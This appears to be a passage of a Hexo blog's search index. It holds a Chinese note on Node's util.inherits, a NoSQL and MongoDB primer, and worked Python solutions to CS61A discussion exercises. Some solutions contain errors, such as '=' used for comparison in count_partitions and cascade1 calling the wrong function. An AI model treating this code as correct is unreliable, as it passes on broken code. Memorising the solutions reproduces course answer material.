<p>关键性的一句是最后一句，我们利用了<code>Object.setPrototypeOf</code>方法直接将子类的<code>prototype</code>的<code>__proto__</code>关联到父类的<code>prototype</code>上。我们还发现在调用<code>inherits</code>函数时还将在子类的构造器上额外定义一个<code>super_</code>属性，用这个属性可以方便的找到父类构造器。并且官方文档不建议我们使用该方法，可以使用ES6内建的对类和继承的支持。</p>
<p><a href="https://nodejs.org/docs/latest/api/util.html#util_util_inherits_constructor_superconstructor" target="_blank" rel="noopener"><span style = "color: red">inherits文档</span></a></p>
<p>曾经的nodejs采用过下面这种实现:</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">exports.inherits = <span class="function"><span class="keyword">function</span>(<span class="params">ctor, superCtor</span>) </span>&#123;</span><br><span class="line">    ctor.super_ = superCtor;</span><br><span class="line">    ctor.prototype = <span class="built_in">Object</span>.create(superCtor.prototype, &#123;</span><br><span class="line">        <span class="keyword">constructor</span>: &#123;</span><br><span class="line">            value: ctor,</span><br><span class="line">            enumerable: <span class="literal">false</span>,</span><br><span class="line">            writable: <span class="literal">true</span>,</span><br><span class="line">            configurable: <span class="literal">true</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>原型链</tag>
        <tag>继承</tag>
      </tags>
  </entry>
  <entry>
    <title>NoSQL</title>
    <url>/2019/02/08/NoSQL/</url>
    <content><![CDATA[<h1 id="NoSQL"><a href="#NoSQL" class="headerlink" title="NoSQL"></a>NoSQL</h1><p>NoSQL(Not Only SQL)意指不仅仅是SQL(Structured Query Language)。是为了应对传统关系型数据库所不能解决的挑战而生的。可以分为以下四类：</p>
<ul>
<li>文档数据库（mongodb）</li>
<li>键值对数据库（redis）</li>
<li>列族（column-family）数据库（Cassandra）</li>
<li>图数据库（Neo4J）</li>
</ul>
<p>通用情况下，文档数据库能提供良好的性能以及可伸缩性。在不需要复杂的查询需求时，键值对数据库可以提供最佳性能。</p>
<h2 id="文档数据库（document-database）"><a href="#文档数据库（document-database）" class="headerlink" title="文档数据库（document database）"></a>文档数据库（document database）</h2><p>文档（document）也就是自包含的一块信息，用于描述单一实体（entity）。如下面的JSON文档：</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">"firstName"</span>: <span class="string">"John"</span>,</span><br><span class="line">  <span class="attr">"lastName"</span>: <span class="string">"Dahn"</span>,</span><br><span class="line">  <span class="attr">"age"</span>: <span class="number">25</span>,</span><br><span class="line">  <span class="attr">"address"</span>: &#123;</span><br><span class="line">    <span class="attr">"streetAddress"</span>: <span class="string">"21 2nd Street"</span>,</span><br><span class="line">    <span class="attr">"city"</span>: <span class="string">"Shanghai"</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>当然也可以使用XML数据格式甚至是二进制格式表示这个document，在这里我们采用了JSON。关系型数据库中，这样的document会存放在两个不同的表中，一个persons表，一个addresses表。文档数据库中就仅仅是一个文档。</p>
<h2 id="键值数据库"><a href="#键值数据库" class="headerlink" title="键值数据库"></a>键值数据库</h2><p>键值数据库就是保留了必要功能的精简版的文档数据库。键值数据库的键是一个特殊的ID，用于标识某一特定文档，而值则是该键对应的文档。不同的是，键值数据库只允许通过键查询，而文档数据库可以根据文档的内容进行查询，这就使得键值数据库可针对基于键的查询做性能上的优化，并且它们也可以对值进行压缩。</p>
<p>Redis就是很优秀的键值数据库，实际上它将整个数据库保存在RAM中，而在硬盘中做备份，具有闪电般的性能。</p>
<h2 id="MongoDB"><a href="#MongoDB" class="headerlink" title="MongoDB"></a>MongoDB</h2><p>MongoDB名字来源于humongous，下载的MongoDB包含的mongod.exe是MongoDB的守护程序，也就是主服务器二进制文件。为了开启数据库服务器，可以执行它。而mongo.exe则是MongoDB提供的repl工具，用于管理数据库以及进行一些测试性的实验。</p>
<p>MongoDB的运行需要一个数据文件夹（在MongoDB的语境中叫做<code>dbpath</code>）来存储数据库数据。默认的<code>dbpath</code>是<code>data/db</code>（取决于当前工作的磁盘），最好总是指定一个明确的<code>dbpath</code>。</p>
]]></content>
      <categories>
        <category>database</category>
      </categories>
      <tags>
        <tag>mongodb</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61a-disc01</title>
    <url>/2018/08/28/cs61a-disc01/</url>
    <content><![CDATA[<h1 id="Control"><a href="#Control" class="headerlink" title="Control"></a>Control</h1><h2 id="If-statement"><a href="#If-statement" class="headerlink" title="If statement"></a>If statement</h2><p>Alfonso will only wear a jacket outside if it is below 60 degrees or it is raining.<br>Write a function that takes in the current temperature and a boolean value telling<br>if it is raining and returns True if Alfonso will wear a jacket and False otherwise.<br>First, try solving this problem using an if statement.</p>
<a id="more"></a>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wears_jacket_with_if</span><span class="params">(temp, raining)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; wears_jacket(90, False)</span></span><br><span class="line"><span class="string">    False</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; wears_jacket(40, False)</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; wears_jacket(100, True)</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> temp &lt; <span class="number">60</span> <span class="keyword">or</span> raining:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure>
<p>Note that we’ll either return True or False based on a single condition, whose<br>truthiness value will also be either True or False. Knowing this, try to write this<br>function using a single line.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">wears_jacket</span><span class="params">(temp, raining)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> temp &lt; <span class="number">60</span> <span class="keyword">or</span> raining</span><br></pre></td></tr></table></figure>

<h2 id="While-loop"><a href="#While-loop" class="headerlink" title="While loop"></a>While loop</h2><p>Q1: What is the result of evaluating the following code?</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">square</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x * x</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">so_slow</span><span class="params">(num)</span>:</span></span><br><span class="line">    x = num</span><br><span class="line">    <span class="keyword">while</span> x &gt; <span class="number">0</span>:</span><br><span class="line">        x = x + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> x / <span class="number">0</span></span><br><span class="line">square(so_slow(<span class="number">5</span>))</span><br></pre></td></tr></table></figure>
<p>Infinite loop because x will always be greater than 0; the num / 0 is never executed.</p>
<p>Q2: Write a function that returns True if n is a prime number and False otherwise. After<br>you have a working solution, think about potential ways to make your solution more<br>efficient.<br>Hint: use the % operator: x % y returns the remainder of x when divided by y.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_prime</span><span class="params">(n)</span>:</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>is_prime(10)</span></span><br><span class="line"><span class="string">False</span></span><br><span class="line"><span class="string"><span class="meta">&gt;&gt;&gt; </span>is_prime(7)</span></span><br><span class="line"><span class="string">True</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        k = <span class="number">2</span></span><br><span class="line">        <span class="keyword">while</span> k &lt;= sqrt(n):</span><br><span class="line">            <span class="keyword">if</span> n % k == <span class="number">0</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            k += <span class="number">1</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br></pre></td></tr></table></figure>
<h1 id="Environment-diagram"><a href="#Environment-diagram" class="headerlink" title="Environment diagram"></a>Environment diagram</h1><p>An environment diagram keeps track of all the variables that have been defined<br>and the values they are bound to. We will be using this tool throughout the course<br>to understand complex programs involving several different objects and function<br>calls.</p>
<p>Remember that programs are simply a set of statements, or instructions, so drawing<br>diagrams that represent these programs also involve following sets of instructions!<br>Let’s dive in.</p>


<h2 id="Assignment-Statement"><a href="#Assignment-Statement" class="headerlink" title="Assignment Statement"></a>Assignment Statement</h2><p>Assignment statements, such as x = 3, define variables in programs. To execute<br>one in an environment diagram, record the variable name and the value:</p>
<ol>
<li>Evaluate the expression on the right side of the = sign</li>
<li>Write the variable name and the expression’s value in the current frame</li>
</ol>
<p>Q1: Use these rules to draw a simple diagram for the assignment statements below.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x = <span class="number">10</span> % <span class="number">4</span></span><br><span class="line">y = x</span><br><span class="line">x **= <span class="number">2</span></span><br></pre></td></tr></table></figure>


<h2 id="def-Statements"><a href="#def-Statements" class="headerlink" title="def Statements"></a>def Statements</h2><p>def statements create function objects and bind them to a name. To diagram def<br>statements, record the function name and bind the function object to the name.<br>It’s also important to write the parent frame of the function, which is where the<br>function is defined.</p>
<ol>
<li>Draw the function object to the right-hand-side of the frames, denoting the<br>intrinsic name of the function, its parameters, and the parent frame (e.g. func<br>square(x) [parent = Global].</li>
<li>Write the function name in the current frame and draw an arrow from the<br>name to the function object.</li>
</ol>
<p>Q2: Use these rules and the rules for assignment statements to draw a diagram for the<br>code below.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">double</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x * <span class="number">2</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">triple</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x * <span class="number">3</span></span><br><span class="line">hmmm = double</span><br><span class="line">double = triple</span><br></pre></td></tr></table></figure>

<h2 id="Call-Expressions"><a href="#Call-Expressions" class="headerlink" title="Call Expressions"></a>Call Expressions</h2><p>Call expressions, such as square(2), apply functions to arguments. When executing<br>call expressions, we create a new frame in our diagram to keep track of local<br>variables:</p>
<ol>
<li>Evaluate the operator, which should evaluate to a function.</li>
<li>Evaluate the operands from left to right.</li>
<li>Draw a new frame, labelling it with the following: 1<ul>
<li>A unique index (f1, f2, f3, …)</li>
<li>The intrinsic name of the function, which is the name of the function<br>object itself. For example, if the function object is func square(x)<br>[parent=Global], the intrinsic name is square.</li>
<li>The parent frame ([parent=Global])</li>
</ul>
</li>
<li>Bind the formal parameters to the argument values obtained in step 2 (e.g.<br>bind x to 3).</li>
<li>Evaluate the body of the function in this new frame until a return value is<br>obtained. Write down the return value in the frame.<br>If a function does not have a return value, it implicitly returns None. In that case,<br>the “Return value” box should contain None.</li>
</ol>
<p>Q3: Let’s put it all together! Draw an environment diagram for the following code.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">double</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> x * <span class="number">2</span></span><br><span class="line">hmmm = double</span><br><span class="line">wow = double(<span class="number">3</span>)</span><br><span class="line">hmmm(wow)</span><br></pre></td></tr></table></figure>


<p>Q4: Draw the environment diagram that results from executing the code below. What<br>will be displayed when running the code (note this separately from the diagram)?</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> operator <span class="keyword">import</span> add</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    sub = add</span><br><span class="line">    <span class="keyword">return</span> a - b</span><br><span class="line">add = sub</span><br><span class="line">sub = min</span><br><span class="line">print(add(<span class="number">2</span>, sub(<span class="number">2</span>, <span class="number">3</span>)))</span><br></pre></td></tr></table></figure>

<p>Print output: 0</p>
]]></content>
      <categories>
        <category>CS61A</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>SICP</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61a-disc02</title>
    <url>/2018/08/28/cs61a-disc02/</url>
    <content><![CDATA[<h1 id="Higher-Order-Functions"><a href="#Higher-Order-Functions" class="headerlink" title="Higher Order Functions"></a>Higher Order Functions</h1><h2 id="HOFs-in-Environment-Diagrams"><a href="#HOFs-in-Environment-Diagrams" class="headerlink" title="HOFs in Environment Diagrams"></a>HOFs in Environment Diagrams</h2><p>Recall that an environment diagram keeps track of all the variables that<br>have been defined and the values they are bound to. However, values are<br>not necessarily only integers and strings. Environment diagrams can model<br>more complex programs that utilize higher order functions.</p>
<a id="more"></a>

<p>1.2 Write curry2 as a lambda function</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">curry2 = <span class="keyword">lambda</span> h: <span class="keyword">lambda</span> x: <span class="keyword">lambda</span> y: h(x, y)</span><br></pre></td></tr></table></figure>
<p>1.3 Draw the environment diagram that results from executing the code below.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="number">7</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(x)</span>:</span></span><br><span class="line">    n = <span class="number">8</span></span><br><span class="line">    <span class="keyword">return</span> x + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">g</span><span class="params">(x)</span>:</span></span><br><span class="line">    n = <span class="number">9</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">h</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">return</span> x + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> h</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(f, x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> f(x + n)</span><br><span class="line"></span><br><span class="line">f = f(g, n)</span><br><span class="line">g = (<span class="keyword">lambda</span> y: y())(f)</span><br></pre></td></tr></table></figure>


<p>1.4 The following question is extremely difficult. Something like this would not<br>appear on the exam. Nonetheless, it’s a fun problem to try.<br>Draw the environment diagram that results from executing the code below.<br>Note that using the + operator with two strings results in the second string<br>being appended to the first. For example “C” + “S” concatenates the two<br>strings into one string “CS”</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">y = <span class="string">"y"</span></span><br><span class="line">h = y</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">y</span><span class="params">(y)</span>:</span></span><br><span class="line">    h = <span class="string">"h"</span></span><br><span class="line">    <span class="keyword">if</span> y == h:</span><br><span class="line">        <span class="keyword">return</span> y + <span class="string">"i"</span></span><br><span class="line">    y = <span class="keyword">lambda</span> y: y(h)</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">lambda</span> h: y(h)</span><br><span class="line">y = y(y)(y)</span><br></pre></td></tr></table></figure>
<h2 id="Writing-Higher-Order-Functions"><a href="#Writing-Higher-Order-Functions" class="headerlink" title="Writing Higher Order Functions"></a>Writing Higher Order Functions</h2><p>1.5 Write a function that takes in a function cond and a number n and prints<br>numbers from 1 to n where calling cond on that number returns True.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keep_ints</span><span class="params">(cond, n)</span>:</span></span><br><span class="line">    <span class="string">"""Print out all integers 1..i..n where cond(i) is true</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; def is_even(x):</span></span><br><span class="line"><span class="string">    ...     # Even numbers have remainder 0 when divided by 2.</span></span><br><span class="line"><span class="string">    ...     return x % 2 == 0</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; keep_ints(is_even, 5)</span></span><br><span class="line"><span class="string">    2</span></span><br><span class="line"><span class="string">    4</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &lt;= n:</span><br><span class="line">        <span class="keyword">if</span> cond(i):</span><br><span class="line">            print(i)</span><br><span class="line">        i += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<p>1.6 Write a function similar to keep_ints like before, but now it takes in a<br>number n and returns a function that has one parameter cond. The returned<br>function prints out numbers from 1 to n where calling cond on that number<br>returns True.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">keep_ints</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="string">"""Returns a function which takes one parameter cond and prints out</span></span><br><span class="line"><span class="string">    all integers 1..i..n where calling cond(i) returns True.</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; def is_even(x):</span></span><br><span class="line"><span class="string">    ...     # Even numbers have remainder 0 when divided by 2.</span></span><br><span class="line"><span class="string">    ...     return x % 2 == 0</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; keep_ints(5)(is_even)</span></span><br><span class="line"><span class="string">    2</span></span><br><span class="line"><span class="string">    4</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(cond)</span>:</span></span><br><span class="line">        i = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> i &lt;= n:</span><br><span class="line">            <span class="keyword">if</span> cond(i):</span><br><span class="line">                print(i)</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> f</span><br></pre></td></tr></table></figure>
<h1 id="Recursion"><a href="#Recursion" class="headerlink" title="Recursion"></a>Recursion</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">factorial</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span> <span class="keyword">or</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> n * factorial(n<span class="number">-1</span>)</span><br></pre></td></tr></table></figure>
<p>A recursive function is a function that is defined in terms of itself. A good<br>example is the factorial function. Although we haven’t finished defining<br>factorial, we are still able to call it since the function body is not evaluated<br>until the function is called. Note that when n is 0 or 1, we just return 1.<br>This is known as the base case, and it prevents the function from infinitely<br>recursing. Now we can compute factorial(2) in terms of factorial(1),<br>and factorial(3) in terms of factorial(2), and factorial(4) – well, you<br>get the idea.</p>
<p>There are three common steps in a recursive definition:</p>
<ol>
<li>Figure out your base case: The base case is usually the simplest<br>input possible to the function. For example, factorial(0) is 1 by<br>definition. You can also think of a base case as a stopping condition<br>for the recursion. If you can’t figure this out right away, move on to<br>the recursive case and try to figure out the point at which we can’t<br>reduce the problem any further.</li>
<li>Make a recursive call with a simpler argument: Simplify your<br>problem, and assume that a recursive call for this new problem will<br>simply work. This is called the “leap of faith”. For factorial, we<br>reduce the problem by calling factorial(n-1).</li>
<li>Use your recursive call to solve the full problem: Remember<br>that we are assuming the recursive call works. With the result of the<br>recursive call, how can you solve the original problem you were asked?<br>For factorial, we just multiply (n − 1)! by n.<br>Note: One way to go understand recursion is to separate out two things: “internal<br>correctness” and not running forever (known as “halting”).<br>A recursive function is internally correct if it is always does the right thing assuming<br>that every recursive call does the right thing. For example, the same factorial<br>function from above but with no base case is internally correct, but does not halt.<br>A recursive function is correct if and only if it is both internally correct and halts; but<br>you can check each property separately. The “recursive leap of faith” is temporarily<br>placing yourself in a mindset where you only check internal correctness.</li>
</ol>
<h2 id="Questions"><a href="#Questions" class="headerlink" title="Questions"></a>Questions</h2><p>2.1 Write a function that takes two numbers m and n and returns their product.<br>Assume m and n are positive integers. Use recursion, not mul or * !<br>Hint: 5 * 3 = 5 + 5 * 2 = 5 + 5 + 5 * 1.<br>For the base case, what is the simplest possible input for multiply?<br>For the recursive case, what does calling multiply(m - 1, n) do? What<br>does calling multiply(m, n - 1) do? Do we prefer one over the other?</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">multiply</span><span class="params">(m, n)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; multiply(5, 3)</span></span><br><span class="line"><span class="string">    15</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> m</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> m + multiply(m, n - <span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>2.2 Write a recursive function that takes in an integer n and prints out a countdown<br>from n to 1.<br>First, think about a base case for the countdown function. What is the<br>simplest input the problem could be given?<br>After you’ve thought of a base case, think about a recursive call with a<br>smaller argument that approches the base case. What happens if you call<br>countdown(n - 1)?<br>Then, put the base case and the recursive call together, and think about<br>where a print statement would be needed.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">countdown</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; countdown(3)</span></span><br><span class="line"><span class="string">    3</span></span><br><span class="line"><span class="string">    2</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    print(n)</span><br><span class="line">    countdown(n - <span class="number">1</span>)</span><br></pre></td></tr></table></figure>

<p>2.3 How can we change countdown to count up instead without modifying a lot<br>of the code?</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">countdown</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; countdown(3)</span></span><br><span class="line"><span class="string">    3</span></span><br><span class="line"><span class="string">    2</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    countdown(n - <span class="number">1</span>)</span><br><span class="line">    print(n)</span><br></pre></td></tr></table></figure>

<p>2.4 Write a recursive function that takes a number n and returns the sum of every<br>other digit, starting from the rightmost digit. Assume n is non-negative.<br>You might find the operators // and % useful.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum_every_other_digit</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; sum_every_other_digit(7)</span></span><br><span class="line"><span class="string">    7</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; sum_every_other_digit(30)</span></span><br><span class="line"><span class="string">    0</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; sum_every_other_digit(228)</span></span><br><span class="line"><span class="string">    10</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; sum_every_other_digit(123456)</span></span><br><span class="line"><span class="string">    12</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; sum_every_other_digit(1234567) # 1 + 3 + 5 + 7</span></span><br><span class="line"><span class="string">    16</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> n % <span class="number">10</span> + sum_every_other_digit(n // <span class="number">100</span>)</span><br></pre></td></tr></table></figure>

<p>2.5 Draw an environment diagram for the following code:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rec</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> y &gt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> x * rec(x, y - <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">rec(<span class="number">3</span>, <span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<p>Bonus question: what does this function do?<br>x ** y</p>
]]></content>
      <categories>
        <category>CS61A</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>SICP</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61a-disc03</title>
    <url>/2018/08/29/cs61a-disc03/</url>
    <content><![CDATA[<h1 id="Lecture-example"><a href="#Lecture-example" class="headerlink" title="Lecture example"></a>Lecture example</h1><p>The order of recursion</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cascade</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; cascade(1234)</span></span><br><span class="line"><span class="string">    1234</span></span><br><span class="line"><span class="string">    123</span></span><br><span class="line"><span class="string">    12</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    12</span></span><br><span class="line"><span class="string">    123</span></span><br><span class="line"><span class="string">    1234</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">10</span>:</span><br><span class="line">        print(n)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(n)</span><br><span class="line">        cascade(n // <span class="number">10</span>)</span><br><span class="line">        print(n)</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cascade1</span><span class="params">(n)</span>:</span></span><br><span class="line">    print(n)</span><br><span class="line">    <span class="keyword">if</span> n &gt;= <span class="number">10</span>:</span><br><span class="line">        cascade(n // <span class="number">10</span>)</span><br><span class="line">        print(n)</span><br></pre></td></tr></table></figure>


<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">inverse_cascade</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; inverse_cascade(1234)</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    12</span></span><br><span class="line"><span class="string">    123</span></span><br><span class="line"><span class="string">    1234</span></span><br><span class="line"><span class="string">    123</span></span><br><span class="line"><span class="string">    12</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    grow(n)</span><br><span class="line">    print(n)</span><br><span class="line">    shrink(n)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f_then_g</span><span class="params">(f, g, n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n:</span><br><span class="line">        f(n)</span><br><span class="line">        g(n)</span><br><span class="line"></span><br><span class="line">grow = <span class="keyword">lambda</span> n: f_then_g(grow, <span class="keyword">print</span>, n // <span class="number">10</span>)</span><br><span class="line">shrink = <span class="keyword">lambda</span> n: f_then_g(<span class="keyword">print</span>, shrink, n // <span class="number">10</span>)</span><br></pre></td></tr></table></figure>
<p>Tree recursion</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> n == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> fib(n - <span class="number">1</span>) + fib(n - <span class="number">2</span>)</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count_partitions</span><span class="params">(n, m)</span>:</span></span><br><span class="line">    <span class="string">"""Count the partitions of n using parts up to size m.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; count_partitions(6, 4)</span></span><br><span class="line"><span class="string">    9</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; count_partitions(10, 10)</span></span><br><span class="line"><span class="string">    42</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">if</span> n = <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">    <span class="keyword">elif</span> n &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">elif</span> m = <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        with_m = count_partitions(n - m, m);</span><br><span class="line">        without_m = count_partitions(n, m - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> with_m + without_m</span><br></pre></td></tr></table></figure>

